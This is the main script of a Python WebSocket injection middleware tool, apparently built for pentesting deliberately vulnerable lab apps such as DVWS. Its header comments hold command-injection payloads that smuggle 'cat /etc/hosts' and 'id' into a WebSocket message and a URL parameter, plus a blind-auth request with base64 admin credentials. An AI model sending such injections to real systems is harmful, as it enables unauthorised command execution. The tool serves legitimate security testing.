#!/usr/bin/env python3
# dynomutt.py

# WARN: websockets is not current from archlinux repos,
# it is missing sync.client --
# pip install websockets bottle --user
# websockets 11.0.3

# NOTE: testing --
# https://github.com/interference-security/DVWS/ --
# https://github.com/rayhan0x01/nodejs-websocket-sqli --
# https://github.com/Serhatcck/vulnsocket --
# https://www.piesocket.com/websocket-tester --

# NOTE: manually --
# echo -ne '{"auth_user":"YWRtaW4=","auth_pass":"YWRtaW4="}' \
# | rlwrap websocat 'ws://dvws.local:8080/authenticate-user-blind' --async-stdio 2>/dev/null  | html2text
# echo -ne '127.0.0.1;cat /etc/hosts' | rlwrap websocat 'ws://dvws.local:8080/command-execution'
# curl -sk -X GET 'http://127.0.0.1:8000/param?data=127.0.0.1;id' 2>/dev/null ; echo

import sys
import argparse

from modules import middleware_handler
from modules import logging_handler

# from helpers import do_burp
from helpers import do_examples

# main --
if __name__ == "__main__":
    parser = argparse.ArgumentParser(prog="dynomutt", description="Asynchronous Websocket Injection Middleware")

    # bottle opts --
    parser.add_argument("-l", "--lhost", dest="lhost", help="Listen Host")
    parser.add_argument("-p", "--lport", dest="lport", help="Listen Port")
    parser.add_argument("-d", "--debug", action="store_true", dest="debug", help="Enable Bottle Debug")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable Verbose Mode")

    # websocket opts --
    parser.add_argument("-u", "--url", dest="url", help="Target WebSocket Url")
    parser.add_argument("-k", "--ignore-ssl", action="store_true", dest="ignore_ssl", help="Ignore SSL Warnings")
    parser.add_argument("-t", "--timeout", dest="timeout", type=int, help="WebSocket Timeout in seconds")
    parser.add_argument(
        "-H",
        "--headers",
        dest="headers",
        help="Header `Name: Value, Name: Value`, separated by comma.",
    )

    # FIXME: add matchers --
    # test with file_inclusion; root --
    parser.add_argument('--ms', dest='match_string', help='Match Response String')

    # parser.add_argument("-r", "--raw", dest="raw", help="Burp Request File")
    parser.add_argument("-w", "--write", dest="write", help="Write Responses to File")
    parser.add_argument("-e", "--examples", action="store_true", dest="examples", help="Examples Menu")

    try:
        args = parser.parse_args()
        logging_handler.info("=> Starting dynomutt.py")

        if args.examples:
            do_examples.examples()

        # NOTE: send to req functions --
        # may hold on this ??
        # if args.raw:
        #     do_burp = do_burp.BurpParser(args.raw, args.verbose)
        #     parsed = do_burp.burp_raw_parse()

        #     print(parsed)
        # sys.exit(0)

        # middleware handler --
        handler = middleware_handler.MiddlewareServer(
            args.url, args.headers, args.ignore_ssl, args.timeout, args.match_string
        )
        handler.run(args.lhost, args.lport, args.debug)

    except KeyboardInterrupt:
        logging_handler.error("=> Keyboard interrupt")

    except Exception as err:
        logging_handler.error(err)

    except SystemExit:
        sys.stdout.write("\n")
        sys.stdout.flush()
